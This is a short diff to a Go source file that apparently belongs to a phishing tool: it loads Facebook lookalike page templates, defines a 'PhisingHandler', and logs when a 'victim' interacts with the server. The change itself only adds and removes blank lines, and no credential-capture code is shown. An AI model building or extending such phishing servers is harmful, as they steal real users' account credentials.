@@ -13,6 +13,7 @@ var tpl *template.Template
 
 func init() {
 	tpl = template.Must(template.ParseGlob("templates/facebook/*.gohtml"))
+
 }
 
 func PhisingHandler(p int, url string) {
@@ -26,7 +27,6 @@ func index(w http.ResponseWriter, r *http.Request) {
 	fmt.Println("\n\n  " + Colors.Red() + " [+] " + Colors.White() + "  Victum is interacting with the server")
 	tpl.ExecuteTemplate(w, "index.gohtml", nil)
 }
-
 func processor(url string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 
